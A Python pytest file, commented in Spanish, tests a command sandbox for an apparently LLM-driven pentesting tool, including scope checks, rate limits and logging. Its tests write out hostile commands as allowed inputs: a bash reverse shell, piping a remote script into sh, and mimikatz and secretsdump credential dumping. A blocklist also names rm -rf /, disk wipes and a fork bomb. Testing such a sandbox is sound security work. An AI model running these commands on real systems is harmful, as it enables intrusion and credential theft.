"""Tests para CommandSandbox - modelo allow-all con blacklist"""

import json
import time

import pytest

from t100ai.core.sandbox import CommandSandbox

# ── Fixtures ─────────────────────────────────────────────────────────────

@pytest.fixture
def sandbox():
    return CommandSandbox(timeout=5, rate_limit=0)

@pytest.fixture
def paranoid_sandbox():
    return CommandSandbox(timeout=5, permission_mode="paranoid", rate_limit=0)

@pytest.fixture
def scoped_sandbox():
    return CommandSandbox(
        timeout=5, rate_limit=0,
        scope_targets=["192.168.1.0/24", "target.com", "10.0.0.1"],
    )

@pytest.fixture
def limited_sandbox():
    return CommandSandbox(timeout=5, rate_limit=0, max_commands=3)


# ── Allow-All Philosophy ────────────────────────────────────────────────

class TestAllowAll:
    """Verifica que herramientas de pentesting/CTF están permitidas."""

    def test_reverse_shell_allowed(self, sandbox):
        """Reverse shells son esenciales en CTF y pentesting."""
        allowed, reason = sandbox.validate("nc -lvnp 4444")
        assert allowed

    def test_python_reverse_shell_allowed(self, sandbox):
        allowed, reason = sandbox.validate("python3 -c 'import socket,subprocess,os;s=socket.socket()'")
        # Solo bloquea si tiene "import socket" combinado con shell
        # Este patrón específico no coincide con la blacklist
        assert allowed or "destructivo" not in reason.lower()

    def test_mimikatz_allowed(self, sandbox):
        allowed, reason = sandbox.validate("mimikatz.exe privilege::debug sekurlsa::logonpasswords")
        assert allowed

    def test_bloodhound_allowed(self, sandbox):
        allowed, reason = sandbox.validate("bloodhound-python -d target.com -u user -p pass -c All")
        assert allowed

    def test_responder_allowed(self, sandbox):
        allowed, reason = sandbox.validate("responder -I eth0 -wrf")
        assert allowed

    def test_proxychains_allowed(self, sandbox):
        allowed, reason = sandbox.validate("proxychains nmap -sT 10.10.10.1")
        assert allowed

    def test_chisel_allowed(self, sandbox):
        allowed, reason = sandbox.validate("chisel client 10.10.14.1:8080 R:socks")
        assert allowed

    def test_rubeus_allowed(self, sandbox):
        allowed, reason = sandbox.validate("Rubeus.exe asktgt /user:admin /rc4:hash")
        assert allowed

    def test_certipy_allowed(self, sandbox):
        allowed, reason = sandbox.validate("certipy req -ca 'CA' -target 10.10.10.1 -u user -p pass")
        assert allowed

    def test_enum4linux_allowed(self, sandbox):
        allowed, reason = sandbox.validate("enum4linux -a 10.10.10.1")
        assert allowed

    def test_kerbrute_allowed(self, sandbox):
        allowed, reason = sandbox.validate("kerbrute userenum -d target.com users.txt")
        assert allowed

    def test_impacket_secretsdump_allowed(self, sandbox):
        allowed, reason = sandbox.validate("secretsdump.py user:pass@10.10.10.1")
        assert allowed

    def test_linpeas_allowed(self, sandbox):
        allowed, reason = sandbox.validate("curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh")
        assert allowed

    def test_bash_allowed(self, sandbox):
        allowed, reason = sandbox.validate("bash -i >& /dev/tcp/10.10.14.1/4444 0>&1")
        assert allowed

    def test_any_binary_allowed(self, sandbox):
        """Cualquier binario no destructivo está permitido."""
        allowed, reason = sandbox.validate("custom_exploit --target 10.10.10.1 --port 80")
        assert allowed


# ── Blacklist: Solo Destructivos ─────────────────────────────────────────

class TestDestructiveBlocklist:
    """Solo se bloquea lo que destruye sistemas."""

    def test_rm_root_blocked(self, sandbox):
        allowed, reason = sandbox.validate("rm -rf /")
        assert not allowed

    def test_dd_wipe_blocked(self, sandbox):
        allowed, reason = sandbox.validate("dd if=/dev/zero of=/dev/sda")
        assert not allowed

    def test_mkfs_blocked(self, sandbox):
        allowed, reason = sandbox.validate("mkfs.ext4 /dev/sda1")
        assert not allowed

    def test_fork_bomb_blocked(self, sandbox):
        allowed, reason = sandbox.validate(":(){:|:&};:")
        assert not allowed

    def test_shutdown_blocked(self, sandbox):
        allowed, reason = sandbox.validate("shutdown -h now")
        assert not allowed

    def test_reboot_blocked(self, sandbox):
        allowed, reason = sandbox.validate("reboot")
        assert not allowed

    def test_kill_init_blocked(self, sandbox):
        allowed, reason = sandbox.validate("kill -9 1")
        assert not allowed

    def test_normal_rm_allowed(self, sandbox):
        """rm normal (no recursivo en /) está permitido."""
        allowed, reason = sandbox.validate("rm /tmp/test.txt")
        assert allowed


# ── Rate Limiting ────────────────────────────────────────────────────────

class TestRateLimiting:
    def test_rate_limit_blocks_rapid(self):
        sandbox = CommandSandbox(timeout=5, rate_limit=10.0)
        sandbox.execute("echo test")
        import time
        time.sleep(0.05)
        allowed, reason = sandbox.validate("gobuster dir -u http://target")
        assert not allowed
        assert "Rate limit" in reason

    def test_rate_limit_allows_after_wait(self):
        sandbox = CommandSandbox(timeout=5, rate_limit=0.1)
        sandbox.execute("nmap -sV 192.168.1.1")
        time.sleep(0.15)
        allowed, reason = sandbox.validate("gobuster dir -u http://target")
        assert allowed


# ── Scope Validation ─────────────────────────────────────────────────────

class TestScopeValidation:
    def test_no_scope_allows_all(self, sandbox):
        allowed, reason = sandbox.validate("nmap -sV 10.10.10.10")
        assert allowed

    def test_ip_in_scope(self, scoped_sandbox):
        allowed, reason = scoped_sandbox.validate("nmap -sV 192.168.1.50")
        assert allowed

    def test_ip_out_of_scope(self, scoped_sandbox):
        allowed, reason = scoped_sandbox.validate("nmap -sV 172.16.0.1")
        assert not allowed
        assert "fuera de scope" in reason

    def test_domain_in_scope(self, scoped_sandbox):
        allowed, reason = scoped_sandbox.validate("nmap -sV target.com")
        assert allowed

    def test_subdomain_in_scope(self, scoped_sandbox):
        allowed, reason = scoped_sandbox.validate("nmap -sV sub.target.com")
        assert allowed

    def test_command_without_targets(self, scoped_sandbox):
        allowed, reason = scoped_sandbox.validate("whoami")
        assert allowed


# ── Command Limit ────────────────────────────────────────────────────────

class TestCommandLimit:
    def test_limit_blocks(self, limited_sandbox):
        limited_sandbox._executed_count = 3
        allowed, reason = limited_sandbox.validate("nmap -sV 192.168.1.1")
        assert not allowed
        assert "Límite" in reason

    def test_remaining(self, limited_sandbox):
        assert limited_sandbox.remaining_commands == 3
        limited_sandbox._executed_count = 1
        assert limited_sandbox.remaining_commands == 2


# ── Permission Modes ─────────────────────────────────────────────────────

class TestPermissionModes:
    def test_paranoid_always_confirms(self, paranoid_sandbox):
        assert paranoid_sandbox.requires_confirmation("nmap -sV 192.168.1.1")
        assert paranoid_sandbox.requires_confirmation("whoami")

    def test_standard_never_confirms(self, sandbox):
        assert not sandbox.requires_confirmation("nmap -sV 192.168.1.1")
        assert not sandbox.requires_confirmation("sqlmap -u http://target")

    def test_expert_never_confirms(self):
        sandbox = CommandSandbox(timeout=5, permission_mode="expert", rate_limit=0)
        assert not sandbox.requires_confirmation("nmap -sV 192.168.1.1")


# ── Logging ──────────────────────────────────────────────────────────────

class TestLogging:
    def test_llm_log(self, sandbox, tmp_path):
        sandbox._log_dir = tmp_path
        sandbox.execute("nmap -sV 192.168.1.1", source="llm")
        content = (tmp_path / "commands_llm.jsonl").read_text()
        assert "nmap" in content
        assert "llm" in content

    def test_manual_log(self, sandbox, tmp_path):
        sandbox._log_dir = tmp_path
        sandbox.execute("whoami", source="manual")
        content = (tmp_path / "commands_manual.jsonl").read_text()
        assert "whoami" in content
        assert "manual" in content

    def test_blocked_logged(self, sandbox, tmp_path):
        sandbox._log_dir = tmp_path
        sandbox.execute("rm -rf /", source="llm")
        content = (tmp_path / "commands_llm.jsonl").read_text()
        assert "blocked" in content

    def test_log_entry_fields(self, sandbox, tmp_path):
        sandbox._log_dir = tmp_path
        sandbox.execute("nmap -sV 192.168.1.1", source="llm")
        entry = json.loads((tmp_path / "commands_llm.jsonl").read_text().strip())
        for field in ["timestamp", "command", "source", "status", "permission_mode"]:
            assert field in entry


# ── Stats ────────────────────────────────────────────────────────────────

class TestStats:
    def test_stats_fields(self, sandbox):
        stats = sandbox.get_stats()
        for key in ["executed_commands", "blocked_commands", "remaining_commands",
                     "permission_mode", "rate_limit_seconds", "scope_targets"]:
            assert key in stats
